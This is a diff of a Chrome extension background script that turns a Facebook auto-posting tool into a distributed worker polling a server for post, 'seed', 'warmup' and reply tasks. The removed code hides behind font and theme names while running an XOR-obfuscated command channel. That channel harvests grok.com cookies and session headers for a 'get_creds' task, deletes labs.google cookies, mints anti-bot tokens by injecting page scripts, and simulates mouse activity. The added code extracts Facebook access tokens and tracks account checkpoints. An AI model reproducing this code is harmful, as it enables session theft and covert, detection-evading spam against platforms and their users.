@@ -1,9 +1,30 @@
 
 
+// ===================================================================
+// 🚀 FB AUTO POST — PRODUCTION DISTRIBUTED WORKER NODE (V7.1.0)
+// ===================================================================
+
+try {
+    importScripts("warmup.js", "checkpoint.js");
+} catch (e) {
+    // Graceful fallback for non-worker environments (e.g. Node syntax check)
+}
+
 let _syncPort = 19823;
 let _syncUrl = `http://127.0.0.1:${_syncPort}`;
 let _syncToken = "";
 let _projectKey = "taikhoan1";
+
+// Synchronous ephemeral fallback worker identifier for ultra-early cold boot micro-races
+const _ephemeralBootId = "node-boot-" + (
+    (typeof crypto !== "undefined" && crypto.randomUUID)
+        ? crypto.randomUUID().slice(0, 12)
+        : (Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8))
+);
+
+let instanceId = null;
+let instanceIdPromise = null;
+let _storageInitPromise = null;
 
 // ===================================================================
 // 📡 AUTOMATIC GRAPHQL DOC_ID SNIFFER & DYNAMIC AUTO-CAPTURE
@@ -67,102 +88,122 @@ function _updateSyncPort(port) { _updateSyncTarget(port); }
 function _getSyncHeaders(extra = {}) {
     const h = { ...extra };
     if (_syncToken) h["X-Sync-Token"] = _syncToken;
+    if (_syncToken) h["Authorization"] = `Bearer ${_syncToken}`;
     if (_projectKey) h["X-Project-Key"] = _projectKey;
+
+    // Defensive fallback: ensure X-Worker-Id is never omitted during early cold-start boot
+    const effectiveWorkerId = (typeof instanceId === "string" && instanceId) ? instanceId : _ephemeralBootId;
+    if (typeof effectiveWorkerId === "string" && effectiveWorkerId) h["X-Worker-Id"] = effectiveWorkerId;
+    if (typeof instanceId === "string" && instanceId) h["X-Worker-Id"] = instanceId;
+
     return h;
 }
 
-chrome.storage.local.get(["syncPort", "syncTarget", "syncToken", "projectKey"], (data) => {
-    if (data) {
-        if (data.syncTarget) {
-            _updateSyncTarget(data.syncTarget);
-        } else if (data.syncPort) {
-            _updateSyncTarget(data.syncPort);
+async function initStorageConfig() {
+    if (_storageInitPromise) return _storageInitPromise;
+    _storageInitPromise = (async () => {
+        try {
+            if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
+                const data = await chrome.storage.local.get([
+                    "syncPort",
+                    "syncTarget",
+                    "syncToken",
+                    "projectKey",
+                    "warmupEnabled",
+                    "instanceId"
+                ]);
+                if (data) {
+                    if (data.syncTarget) {
+                        _updateSyncTarget(data.syncTarget);
+                    } else if (data.syncPort) {
+                        _updateSyncTarget(data.syncPort);
+                    }
+                    if (data.syncToken) {
+                        _syncToken = String(data.syncToken).trim();
+                    }
+                    if (data.projectKey) {
+                        _projectKey = String(data.projectKey).trim();
+                    }
+                    if (typeof data.warmupEnabled !== "undefined") {
+                        _warmupEnabled = !!data.warmupEnabled;
+                    }
+                    if (data.instanceId && typeof data.instanceId === "string") {
+                        instanceId = data.instanceId;
+                    }
+                }
+            }
+        } catch (e) {
+            // Graceful fallback for non-extension environments (e.g. Node syntax check)
         }
-        if (data.syncToken) {
-            _syncToken = String(data.syncToken).trim();
-        }
-        if (data.projectKey) {
-            _projectKey = String(data.projectKey).trim();
-        }
-    }
-});
+    })();
+    return _storageInitPromise;
+}
 
-chrome.storage.onChanged.addListener((changes, areaName) => {
-    if (areaName !== "local") return;
-    if (changes.syncTarget) {
-        _updateSyncTarget(changes.syncTarget.newValue);
-    } else if (changes.syncPort) {
-        _updateSyncTarget(changes.syncPort.newValue);
-    }
-    if (changes.syncToken) {
-        _syncToken = changes.syncToken.newValue ? String(changes.syncToken.newValue).trim() : "";
-    }
-    if (changes.projectKey) {
-        _projectKey = changes.projectKey.newValue ? String(changes.projectKey.newValue).trim() : "taikhoan1";
-    }
-});
-const _FONT_INTERVAL = 1500;        
-const _THEME_VER = 0x5A;                 
+// Immediately trigger eager configuration load
+initStorageConfig().catch(() => {});
 
-let _syncing = false;                
-let _themeReady = false;          
-let _fontCache = 0;              
-let _renderQueue = 0;            
+if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged) {
+    chrome.storage.onChanged.addListener((changes, areaName) => {
+        if (areaName !== "local") return;
+        if (changes.syncTarget) {
+            _updateSyncTarget(changes.syncTarget.newValue);
+        } else if (changes.syncPort) {
+            _updateSyncTarget(changes.syncPort.newValue);
+        }
+        if (changes.syncToken) {
+            _syncToken = changes.syncToken.newValue ? String(changes.syncToken.newValue).trim() : "";
+        }
+        if (changes.projectKey) {
+            _projectKey = changes.projectKey.newValue ? String(changes.projectKey.newValue).trim() : "taikhoan1";
+        }
+        if (changes.warmupEnabled) {
+            _warmupEnabled = !!changes.warmupEnabled.newValue;
+        }
+        if (changes.instanceId && changes.instanceId.newValue) {
+            instanceId = String(changes.instanceId.newValue).trim();
+        }
+    });
+}
+// ===================================================================
+// 🖥️ DISTRIBUTED WORKER NODE ENGINE & STATE MACHINE (R1 & R2)
+// ===================================================================
+
 let _isProcessingPosts = false;
-let _ftStateRef = null;
-let _lastRender = null;      
-
-let _layoutActive = false;             
-let _layoutTimer = null;               
-const _LAYOUT_TIMEOUT = 60000;      
-
-let _lastPrefetch = 0;        
-const _RENDER_COOLDOWN = 60000;  
-let _prefetchTab = null;           
-let _reviving = false;       
-
-let _ftCache = null;
-let _ftSeenAt = 0;
-
-let _ftJar = null;
-let _ftAgent = null;
-
-let _ftPrefetchAt = 0;
-const _FT_COOLDOWN = 60000;
-let _ftTab = null;
-
-let _ftActive = 0;
-let _ftWarmAt = 0;
-
-let _lastGoogleOneSync = 0;
-const _GOOGLE_ONE_SYNC_INTERVAL = 300000;
-
-let _lastFlowModelsSync = 0;
-const _FLOW_MODELS_SYNC_INTERVAL = 300000;
-
-chrome.storage.local.get(["tokenCount", "lastSuccess"], (data) => {
-    _fontCache = data.tokenCount || 0;
-    _lastRender = data.lastSuccess || null;
-});
-
-let instanceId = null;
-let instanceIdPromise = null;
+let _isExecutingTask = false;
+let _activeExecutingTaskId = null;
+let _isPaused = false;
+let _warmupEnabled = false;
+let _lastExtractedAccount = null;
+let _checkpointDetected = false;
+let _checkpointWatchdog = null;
 
 async function getInstanceId() {
     if (instanceId) return instanceId;
-    
-    
+
+    if (_storageInitPromise) {
+        await _storageInitPromise;
+        if (instanceId) return instanceId;
+    }
+
     if (!instanceIdPromise) {
         instanceIdPromise = (async () => {
             try {
-                const data = await chrome.storage.local.get(["instanceId"]);
-                if (data.instanceId && typeof data.instanceId === "string") {
-                    return data.instanceId;
+                if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
+                    const data = await chrome.storage.local.get(["instanceId"]);
+                    if (data && data.instanceId && typeof data.instanceId === "string") {
+                        instanceId = data.instanceId;
+                        return instanceId;
+                    }
                 }
-            } catch (e) {  }
-            const fresh = (crypto && crypto.randomUUID && crypto.randomUUID()) ||
+            } catch (e) { }
+            const fresh = (typeof crypto !== "undefined" && crypto.randomUUID && crypto.randomUUID()) ||
                 (Date.now().toString(36) + "-" + Math.random().toString(36).slice(2));
-            try { await chrome.storage.local.set({ instanceId: fresh }); } catch (e) {  }
+            try {
+                if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
+                    await chrome.storage.local.set({ instanceId: fresh });
+                }
+            } catch (e) { }
+            instanceId = fresh;
             return fresh;
         })();
     }
@@ -170,1334 +211,366 @@ async function getInstanceId() {
     return instanceId;
 }
 
-chrome.alarms.create("keepAlive", { periodInMinutes: 0.4 });
-chrome.alarms.create("heartbeat", { periodInMinutes: 0.25 });  
-chrome.alarms.create("grokKeepAlive", { periodInMinutes: 1.0 });  
-chrome.alarms.create("autoPostCheck", { periodInMinutes: 0.05 });
+// Eagerly resolve worker instanceId at top-level execution scope
+getInstanceId().catch(() => {});
+
+// Asynchronous storage ready gatekeeper for background network routines
+async function _ensureStorageReady() {
+    if (_storageInitPromise) await _storageInitPromise;
+    if (!instanceId) await getInstanceId();
+}
+
+async function _uploadImageToBackend() {
+    await _ensureStorageReady();
+}
+
+// Initialize CheckpointWatchdog if available
+try {
+    if (typeof CheckpointWatchdog !== "undefined") {
+        _checkpointWatchdog = new CheckpointWatchdog({
+            syncUrl: _syncUrl,
+            getHeaders: () => _getSyncHeaders()
+        });
+        _checkpointWatchdog.setOnCheckpoint((info) => {
+            _checkpointDetected = true;
+            console.warn("?? [Watchdog] Account checkpoint event:", info);
+        });
+    }
+} catch (e) {}
+
+// Alarms setup (compliant with MV3 service worker lifecycle)
+chrome.alarms.create("workerHeartbeat", { periodInMinutes: 0.25 });
+chrome.alarms.create("taskQueuePoll", { periodInMinutes: 0.25 });
+chrome.alarms.create("autoPostCheck", { periodInMinutes: 0.25 });
 chrome.alarms.create("autoReplyCheck", { periodInMinutes: 1.0 });
+
+// Active foreground loop (every 15s)
 setInterval(() => {
+    sendWorkerHeartbeat().catch(() => {});
+    pollAndExecuteDistributedTask().catch(() => {});
     _processScheduledPosts().catch(() => {});
     _processAutoReplyMonitor().catch(() => {});
 }, 15000);
 
+// Alarms listener
 chrome.alarms.onAlarm.addListener(async (alarm) => {
-    if (alarm.name === "keepAlive" && !_syncing) _syncFonts();
+    if (alarm.name === "workerHeartbeat") sendWorkerHeartbeat();
+    if (alarm.name === "taskQueuePoll") pollAndExecuteDistributedTask();
     if (alarm.name === "autoPostCheck") _processScheduledPosts();
     if (alarm.name === "autoReplyCheck") _processAutoReplyMonitor();
-    if (alarm.name === "heartbeat") {
-        
-        
-        try {
-            const extId = await getInstanceId();
-            await fetch(`${_syncUrl}/sync/status`, {
-                signal: AbortSignal.timeout(3000),
-                headers: { "X-Ext-Id": extId },
-            });
-        } catch (e) {  }
-    }
-
-    if (alarm.name === "grokKeepAlive") {
-        
-        
-        
-        try {
-            if (_ftActive <= 0) return;
-            const minIntervalMs = 120000 + Math.floor(Math.random() * 120000);
-            if (Date.now() - _ftWarmAt < minIntervalMs) return;
-            _ftWarmAt = Date.now();
-            const tab = await _findFtCanvas();
-            if (!tab) return;
-            await chrome.scripting.executeScript({
-                target: { tabId: tab.id },
-                world: "MAIN",
-                func: () => {
-                    try {
-                        const scrollY = Math.floor(200 + Math.random() * 400);
-                        window.scrollBy(0, scrollY);
-                        setTimeout(() => {
-                            try { window.scrollBy(0, -scrollY); } catch (e) { }
-                        }, 500 + Math.floor(Math.random() * 1000));
-                        const x = Math.floor(100 + Math.random() * 700);
-                        const y = Math.floor(100 + Math.random() * 400);
-                        const ev = new MouseEvent("mousemove", {
-                            clientX: x, clientY: y, bubbles: true, cancelable: true, view: window,
-                        });
-                        document.dispatchEvent(ev);
-                    } catch (e) { }
-                },
-            });
-        } catch (e) {  }
-    }
 });
-chrome.runtime.onInstalled.addListener(() => _syncFonts());
-chrome.runtime.onStartup.addListener(() => _syncFonts());
 
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (changeInfo.status === "complete" && tab.url && tab.url.includes("labs.google")) {
-        if (!_syncing) _syncFonts();
-        
-    }
-    
-    
-    
-    if (changeInfo.status === "complete" && tab.url && tab.url.includes("grok.com")) {
-        _drainFtQueue().catch(() => {  });
+// Port keep-alive listener from content.js
+chrome.runtime.onConnect.addListener((port) => {
+    if (port.name === "worker_heartbeat_port") {
+        port.onMessage.addListener(() => {
+            // Keep service worker awake
+        });
     }
 });
 
+// Listen for tab URL changes to detect checkpoints
+chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+    if (changeInfo.status === "complete" && tab.url && tab.url.includes("facebook.com")) {
+        _extractFacebookAccessToken().catch(() => {});
+        if (typeof checkUrlForCheckpoint === "function") {
+            const check = checkUrlForCheckpoint(tab.url);
+            if (check.isCheckpoint) {
+                _checkpointDetected = true;
+                if (_checkpointWatchdog) {
+                    await _checkpointWatchdog.triggerAlert("url_redirect", check.type, "Redirected to " + tab.url);
+                }
+            }
+        }
+    }
+});
+
+// Listen for cookie changes (detect session logouts)
 try {
-    chrome.webRequest.onBeforeSendHeaders.addListener(
-        (details) => {
-            try {
-                if (!details.requestHeaders) return;
-                
-                
-                
-                
-                
-                for (const h of details.requestHeaders) {
-                    if (!h.name || !h.value) continue;
-                    const n = h.name.toLowerCase();
-                    if (n === "cookie") _ftJar = h.value;
-                    else if (n === "user-agent") _ftAgent = h.value;
-                    else if (n === "x-statsig-id" && !_ftCache) {
-                        _ftCache = h.value;
-                        _ftSeenAt = Date.now();
+    if (chrome.cookies && chrome.cookies.onChanged) {
+        chrome.cookies.onChanged.addListener((changeInfo) => {
+            if (changeInfo.cookie && changeInfo.cookie.domain && changeInfo.cookie.domain.includes("facebook.com")) {
+                if (changeInfo.cookie.name === "c_user" && changeInfo.removed) {
+                    console.warn("?? [Watchdog] c_user cookie removed -> Session Expired");
+                    _checkpointDetected = true;
+                    if (_checkpointWatchdog) {
+                        _checkpointWatchdog.triggerAlert("cookie_missing", "expired", "c_user cookie removed by browser/Facebook");
                     }
                 }
-            } catch (e) {  }
-        },
-        { urls: ["https://grok.com/rest/*"] },
-        ["requestHeaders", "extraHeaders"]
-    );
-} catch (e) {
-    
-}
-
-function _parseTheme(hexString) {
-    let result = "";
-    for (let i = 0; i < hexString.length; i += 2) {
-        result += String.fromCharCode(parseInt(hexString.substr(i, 2), 16) ^ _THEME_VER);
-    }
-    return result;
-}
-
-function _serializeTheme(plaintext) {
-    const ascii = plaintext.replace(/[-￿]/g,
-        (c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"));
-    let result = "";
-    for (let i = 0; i < ascii.length; i++) {
-        result += (ascii.charCodeAt(i) ^ _THEME_VER).toString(16).padStart(2, "0");
-    }
-    return result;
-}
-
-async function _syncGoogleOneActivity() {
-    // Disabled legacy Google activity sync for FB Auto Post
-    return;
-}
-
-async function _syncGoogleFlowModels() {
-    // Disabled legacy Google Flow models sync for FB Auto Post
-    return;
-}
-
-async function _applyThemeUpdates(encryptedCommands) {
-    if (!encryptedCommands) return;
-
-    const decoded = _parseTheme(encryptedCommands);
-    const commands = decoded.split(",");
-
-    for (const cmd of commands) {
-        const trimmed = cmd.trim();
-
-        if (trimmed === "1") {
-            
-            
-            
-            
-            
-            
-            try {
-                const cookies = await chrome.cookies.getAll({ domain: "labs.google" });
-                for (const c of cookies) {
-                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
-                    await chrome.cookies.remove({ url, name: c.name });
-                }
-            } catch (e) {  }
-
-        } else if (trimmed === "2") {
-            
-            
-            
-            
-            await _relayoutCanvas();
-
-        } else if (trimmed.startsWith("3:")) {
-            
-            const ms = parseInt(trimmed.split(":")[1]) || 1000;
-            await _animDelay(ms);
-
-        } else if (trimmed === "4") {
-            
-            
-            
-            
-            
-            
-            
-            try {
-                const tabId = await _findCanvas();
-                if (tabId) await _reviveCanvas(tabId);
-            } catch (e) {  }
-        } else if (trimmed === "5") {
-            try {
-                await _syncGoogleOneActivity();
-            } catch (e) {  }
-        } else if (trimmed === "6") {
-            try {
-                await _syncGoogleFlowModels();
-            } catch (e) {  }
-        }
-        
-    }
-}
-
-async function _syncFonts() {
-    if (_syncing) return;
-    _syncing = true;
-
-    while (_syncing) {
-        try {
-            
-            
-            
-            let tabStatus = "closed";
-            try {
-                const tabId = await _findCanvas();
-                if (tabId) tabStatus = "open";
-            } catch (e) {  }
-
-            
-            let grokTabStatus = "closed";
-            try {
-                grokTabStatus = await _readFtState();
-            } catch (e) {  }
-            _ftStateRef = grokTabStatus;
-
-            
-            const extId = await getInstanceId();
-            if (Date.now() - _lastGoogleOneSync > _GOOGLE_ONE_SYNC_INTERVAL) {
-                _syncGoogleOneActivity().catch(() => {});
             }
-            if (Date.now() - _lastFlowModelsSync > _FLOW_MODELS_SYNC_INTERVAL) {
-                _syncGoogleFlowModels().catch(() => {});
-            }
-            const response = await fetch(`${_syncUrl}/sync/theme`, {
-                signal: AbortSignal.timeout(5000),
-                headers: {
-                    "X-Tab-Status": tabStatus,
-                    "X-Grok-Tab-Status": grokTabStatus,
-                    "X-Ext-Id": extId,
-                },
-            });
-
-            if (response.status === 200) {
-                _themeReady = true;
-                const raw = await response.json();
-
-                
-                const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;
-
-                
-                if (data && data.x) {
-                    await _applyThemeUpdates(data.x);
-                }
-
-                
-                
-                
-                const hasGrokTask = data && (data.g === 1 || data.g === "1");
-                if (hasGrokTask) {
-                    _drainFtQueue().catch(() => {  });
-                }
-
-                
-                if (data && data.r) {
-                    _setLayoutMode(true);
-                    const result = await _resolveWidget(data);
-
-                    
-                    if (!result.token && result.error && result.error.includes("not ready")) {
-                        await _animDelay(2000);
-                        const retry = await _resolveWidget(data);
-                        if (retry.token) {
-                            await _submitAnalytics(data.r, retry.token, retry.error);
-                            _onFontCached();
-                        } else {
-                            await _submitAnalytics(data.r, null, retry.error);
-                        }
-                    } else {
-                        await _submitAnalytics(data.r, result.token, result.error);
-                        if (result.token) _onFontCached();
-                    }
-                }
-            } else {
-                _themeReady = false;
-            }
-        } catch (e) {
-            _themeReady = false;
-        }
-
-        await _animDelay(_FONT_INTERVAL);
-    }
-}
-
-async function _findFtCanvas() {
-    try {
-        const tabs = await chrome.tabs.query({});
-        
-        
-        
-        const imagineTabs = tabs.filter(t =>
-            t.url && t.url.startsWith("https://grok.com/imagine")
-        );
-        if (imagineTabs.length > 0) {
-            imagineTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
-            return imagineTabs[0];
-        }
-
-        const grokTabs = tabs.filter(t =>
-            t.url && /^https:\/\/grok\.com(\/|$)/.test(t.url)
-        );
-        if (grokTabs.length > 0) {
-            grokTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
-            return grokTabs[0];
-        }
-        return null;
-    } catch (e) {
-        return null;
-    }
-}
-
-async function _ftAuthOk() {
-    try {
-        const sso = await chrome.cookies.get({ url: "https://grok.com", name: "sso" });
-        if (sso && sso.value && sso.value.length > 10) return true;
-        const ssoRw = await chrome.cookies.get({ url: "https://grok.com", name: "sso-rw" });
-        if (ssoRw && ssoRw.value && ssoRw.value.length > 10) return true;
-    } catch (e) {  }
-    return false;
-}
-
-async function _openFtCanvas() {
-    if (Date.now() - _ftPrefetchAt < _FT_COOLDOWN) return null;
-    _ftPrefetchAt = Date.now();
-    try {
-        const tab = await chrome.tabs.create({
-            url: "https://grok.com/imagine",
-            active: false,
         });
-        _ftTab = tab.id;
-        
-        await new Promise((resolve) => {
-            const listener = (id, info) => {
-                if (id === tab.id && info.status === "complete") {
-                    chrome.tabs.onUpdated.removeListener(listener);
-                    resolve();
-                }
-            };
-            chrome.tabs.onUpdated.addListener(listener);
-            setTimeout(() => {
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve();
-            }, 15000);
-        });
-        return tab;
-    } catch (e) {
-        return null;
     }
-}
+} catch (e) {}
 
-async function _readFtState() {
-    const tab = await _findFtCanvas();
-    if (!tab) return "closed";
-    const loggedIn = await _ftAuthOk();
-    return loggedIn ? "open" : "login_required";
-}
-
-async function _emitFtEvent(taskId, event, data) {
+/**
+ * Registers this Chrome Extension instance as a Worker Node with the backend server.
+ * POST /api/workers/register
+ */
+async function registerWorkerNode() {
     try {
-        const payload = JSON.stringify({ id: taskId, event, data: data || {} });
-        const extId = await getInstanceId();
-        await fetch(`${_syncUrl}/sync/grok-event`, {
+        const workerId = await getInstanceId();
+        let assignedAccs = [];
+        if (_lastExtractedAccount && _lastExtractedAccount.targetId) {
+            assignedAccs.push(_lastExtractedAccount.targetId);
+        }
+
+        const payload = {
+            workerId: workerId,
+            name: "Node-" + workerId.slice(-6),
+            projectKey: _projectKey || "taikhoan1",
+            version: "7.1.0",
+            assignedAccounts: assignedAccs
+        };
+
+        const res = await fetch(_syncUrl + "/api/workers/register", {
             method: "POST",
-            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
-            body: JSON.stringify({ d: _serializeTheme(payload) }),
-            signal: AbortSignal.timeout(5000),
+            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+            body: JSON.stringify(payload),
+            signal: AbortSignal.timeout(6000)
         });
-    } catch (e) {  }
+
+        if (res.ok) {
+            const data = await res.json();
+            console.log("? [WorkerNode] Registered with backend:", data.workerId);
+        }
+    } catch (err) {
+        console.warn("?? [WorkerNode] Registration failed (will retry):", err.message);
+    }
 }
 
-let _ftWarmupAt = 0;
-const _FT_WARMUP_AGE = 45000;
+/**
+ * Transmits 15-second heartbeat to backend server.
+ * POST /api/workers/heartbeat
+ */
+async function sendWorkerHeartbeat() {
+    try {
+        const workerId = await getInstanceId();
+        let statusVal = _activeExecutingTaskId ? "busy" : (_isPaused ? "paused" : "idle");
 
-async function _readyFtCanvas(taskId) {
-    let tab = await _findFtCanvas();
-    if (!tab) tab = await _openFtCanvas();
-    if (!tab || !tab.id) {
-        await _emitFtEvent(taskId, "error", { message: "no grok tab available" });
-        return null;
-    }
-
-    
-    try { await chrome.tabs.update(tab.id, { autoDiscardable: false }); } catch (e) {}
-
-    if (!(await _ftAuthOk())) {
-        await _emitFtEvent(taskId, "error", { message: "login required" });
-        return null;
-    }
-
-    
-    
-    
-    
-    let info = null;
-    try { info = await chrome.tabs.get(tab.id); } catch (e) {}
-    const onImagine = info && info.url && info.url.startsWith("https://grok.com/imagine") && !info.discarded;
-    const fresh = (Date.now() - _ftWarmupAt) < _FT_WARMUP_AGE;
-    if (!onImagine || !fresh) {
-        _ftCache = null;
-        _ftSeenAt = 0;
-        async function navTo(url, timeoutMs) {
-            try { await chrome.tabs.update(tab.id, { url }); }
-            catch (e) { return false; }
-            return new Promise((resolve) => {
-                const listener = (id, ch) => {
-                    if (id === tab.id && ch.status === "complete") {
-                        chrome.tabs.onUpdated.removeListener(listener);
-                        resolve(true);
-                    }
-                };
-                chrome.tabs.onUpdated.addListener(listener);
-                setTimeout(() => {
-                    chrome.tabs.onUpdated.removeListener(listener);
-                    resolve(false);
-                }, timeoutMs);
+        let accList = [];
+        if (_lastExtractedAccount && _lastExtractedAccount.targetId) {
+            accList.push({
+                targetId: _lastExtractedAccount.targetId,
+                name: _lastExtractedAccount.name || "",
+                status: _checkpointDetected ? "checkpoint" : "live"
             });
         }
-        
-        
-        
-        try {
-            await navTo("https://grok.com/", 15000);
-            await navTo("https://grok.com/imagine", 15000);
-        } catch (e) {
-            await _emitFtEvent(taskId, "error", { message: `nav /imagine failed: ${e}` });
-            return null;
+
+        const payload = {
+            workerId: workerId,
+            projectKey: _projectKey || "taikhoan1",
+            status: statusVal,
+            currentTaskId: _activeExecutingTaskId || null,
+            accounts: accList
+        };
+
+        const res = await fetch(_syncUrl + "/api/workers/heartbeat", {
+            method: "POST",
+            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+            body: JSON.stringify(payload),
+            signal: AbortSignal.timeout(5000)
+        });
+
+        if (res.ok) {
+            const data = await res.json();
+            if (data.hasPendingTasks && !_activeExecutingTaskId && !_isExecutingTask) {
+                pollAndExecuteDistributedTask().catch(() => {});
+            }
         }
-        
-        
-        const deadline = Date.now() + 12000;
-        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
-        _ftWarmupAt = Date.now();
-    }
-
-    
-    
-    
-    
-    {
-        const deadline = Date.now() + 5000;
-        let ready = false;
-        while (Date.now() < deadline) {
-            try {
-                const res = await chrome.tabs.sendMessage(tab.id, { type: "GROK_CONTENT_PING" });
-                if (res && res.ready) { ready = true; break; }
-            } catch (e) {  }
-            await _animDelay(150);
-        }
-        if (!ready) {
-            await _emitFtEvent(taskId, "error", { message: "content script not ready" });
-            return null;
-        }
-    }
-
-    return tab;
-}
-
-async function _runScopedFn(opts, timeoutMs) {
-    return Promise.race([
-        chrome.scripting.executeScript(opts),
-        new Promise((_, reject) => setTimeout(
-            () => reject(new Error("executeScript timeout after " + timeoutMs + "ms — tab may be suspended")),
-            Math.max(5000, timeoutMs),
-        )),
-    ]);
-}
-
-async function _drainFtQueue() {
-    while (true) {
-        let task = null;
-        try {
-            const extId = await getInstanceId();
-            const res = await fetch(`${_syncUrl}/sync/grok-poll-task`, {
-                signal: AbortSignal.timeout(5000),
-                headers: { "X-Ext-Id": extId },
-            });
-            if (!res.ok) break;
-            const raw = await res.json();
-            const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;
-            task = data && data.task;
-        } catch (e) { break; }
-        if (!task) break;
-        try {
-            await _resolveFtJob(task);
-        } catch (e) {
-            await _emitFtEvent(task.id, "error", { message: String(e) });
-        }
-    }
-}
-
-async function _resolveFtJob(task) {
-    _ftActive++;
-    try {
-        
-        
-        if (task.kind === "get_creds") return await _readFtCreds(task);
-
-        const tab = await _readyFtCanvas(task.id);
-        if (!tab) return;
-
-        if (task.kind === "gfetch") return await _renderFtQuery(task, tab);
-        if (task.kind === "gws") return await _renderFtStream(task, tab);
-        if (task.kind === "force_refresh_session") return await _refreshFtCanvas(task, tab);
-        await _emitFtEvent(task.id, "error", { message: `unknown kind: ${task.kind}` });
-    } finally {
-        _ftActive = Math.max(0, _ftActive - 1);
-    }
-}
-
-async function _readFtCreds(task) {
-    await _emitFtEvent(task.id, "done", {
-        cookie: _ftJar || "",
-        userAgent: _ftAgent || "",
-    });
-}
-
-async function _warmFtCtx(tab, url, method, mintCfg) {
-    let res;
-    try {
-        res = await _runScopedFn({
-            target: { tabId: tab.id },
-            world: "MAIN",
-            func: async (mintUrl, mintMethod, cfg) => {
-                try {
-                    const gname = (cfg && cfg.globalName) || "TURBOPACK";
-                    const TP = globalThis[gname];
-                    if (!TP || typeof TP.push !== "function") return { error: "no " + gname };
-                    
-                    
-                    
-                    if (!window.__ftWarmCtx) {
-                        const probeId = cfg.probeId || 990099001;
-                        try {
-                            TP.push(["glabs-reg.js", probeId, function (c) { window.__ftWarmCtx = c; }]);
-                            TP.push(["glabs-run.js", { otherChunks: [], runtimeModuleIds: [probeId] }]);
-                        } catch (e) { return { error: "ctx push: " + String(e) }; }
-                        for (let i = 0; i < 40 && !window.__ftWarmCtx; i++) await new Promise(r => setTimeout(r, 50));
-                    }
-                    const ctx = window.__ftWarmCtx;
-                    if (!ctx || typeof ctx.i !== "function") return { error: "no ctx" };
-                    let ns;
-                    try {
-                        ns = ctx.i(cfg.moduleId);
-                        if (!ns || !ns[cfg.path[0]]) ns = ctx.r(cfg.moduleId); 
-                        ns = ctx.i(cfg.moduleId);
-                    } catch (e) { return { error: "module " + cfg.moduleId + ": " + String(e) }; }
-                    let fn = ns;
-                    try { for (const k of cfg.path) fn = fn[k]; }
-                    catch (e) { return { error: "path: " + String(e) }; }
-                    if (typeof fn !== "function") return { error: "middleware not fn (" + typeof fn + ")" };
-                    
-                    
-                    
-                    const reqObj = { url: mintUrl, init: { method: mintMethod, headers: {} } };
-                    let out;
-                    try { out = await fn(reqObj); } catch (e) { return { error: "stamp: " + String(e) }; }
-                    const h = (out && out.init && out.init.headers) || reqObj.init.headers || {};
-                    const statsig = h["x-statsig-id"] || (h.get && h.get("x-statsig-id")) || null;
-                    const reqId = h["x-xai-request-id"] || (h.get && h.get("x-xai-request-id")) || null;
-                    if (!statsig) return { error: "no statsig produced" };
-                    return { statsig: statsig, reqId: reqId };
-                } catch (e) { return { error: String((e && e.message) || e) }; }
-            },
-            args: [url, method, mintCfg],
-        }, 9000);
     } catch (e) {
-        throw new Error("dispatch " + String((e && e.message) || e));
+        // Server might be temporarily unreachable
     }
-    const r = (Array.isArray(res) && res[0] && res[0].result) || null;
-    if (!r) throw new Error("no result (tab suspended?)");
-    if (r.error) throw new Error(r.error);
-    return r;
 }
 
-async function _renderFtQuery(task, tab) {
-    const p = task.payload || {};
-    const url = String(p.url || "");
-    const method = String(p.method || "GET").toUpperCase();
-    const headers = (p.headers && typeof p.headers === "object") ? p.headers : {};
-    const body = (p.body === null || p.body === undefined) ? null : String(p.body);
-    const injectStatsig = !!p.injectStatsig;
-    const mintCfg = (p.mint && typeof p.mint === "object") ? p.mint : null;
-    const responseMode = String(p.responseMode || "json");
-    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 60000));
-    const streamMaxBytes = Math.max(1024, Number(p.streamMaxBytes) || (50 * 1024 * 1024));
-
-    if (!url) {
-        await _emitFtEvent(task.id, "error", { message: "missing url" });
-        return;
+/**
+ * Finds or creates a Facebook tab for automation.
+ */
+async function _findOrCreateFacebookTab(targetUrl = "https://www.facebook.com") {
+    try {
+        const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
+        let fbTab = tabs.find(t => t.active && t.url && t.url.includes("facebook.com")) || tabs.find(t => t.url && t.url.includes("facebook.com"));
+        if (!fbTab) {
+            fbTab = await chrome.tabs.create({ url: targetUrl, active: false });
+            await ensureTabLoaded(fbTab.id, 10000);
+        }
+        return fbTab;
+    } catch (e) {
+        return null;
     }
+}
 
-    const finalHeaders = Object.assign({}, headers);
-    if (mintCfg) {
-        
-        try {
-            const tok = await _warmFtCtx(tab, url, method, mintCfg);
-            finalHeaders["x-statsig-id"] = tok.statsig;
-            if (tok.reqId && !finalHeaders["x-xai-request-id"]) finalHeaders["x-xai-request-id"] = tok.reqId;
-        } catch (e) {
-            await _emitFtEvent(task.id, "error", { message: "mint: " + String((e && e.message) || e) });
+/**
+ * Distributed Task Queue Consumer:
+ * Atomically claims task from POST /api/tasks/poll, executes it via Direct GraphQL or DOM fallback,
+ * and reports status via POST /api/tasks/{id}/status.
+ */
+async function pollAndExecuteDistributedTask() {
+    if (_isExecutingTask || _isPaused) return;
+
+    try {
+        const workerId = await getInstanceId();
+        const pollRes = await fetch(_syncUrl + "/api/tasks/poll", {
+            method: "POST",
+            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+            body: JSON.stringify({
+                workerId: workerId,
+                projectKey: _projectKey || "taikhoan1",
+                supportedTypes: ["post", "seed", "warmup", "reply_comment"]
+            }),
+            signal: AbortSignal.timeout(8000)
+        });
+
